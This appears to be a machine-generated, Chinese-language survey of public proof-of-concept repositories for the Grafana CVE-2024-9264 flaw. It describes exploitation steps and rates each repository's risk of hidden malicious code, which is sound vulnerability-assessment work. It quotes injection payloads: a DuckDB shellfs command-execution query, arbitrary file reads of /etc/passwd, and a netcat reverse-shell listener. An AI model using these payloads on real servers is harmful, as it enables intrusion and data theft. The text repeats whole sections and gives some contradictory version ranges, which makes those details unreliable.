2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

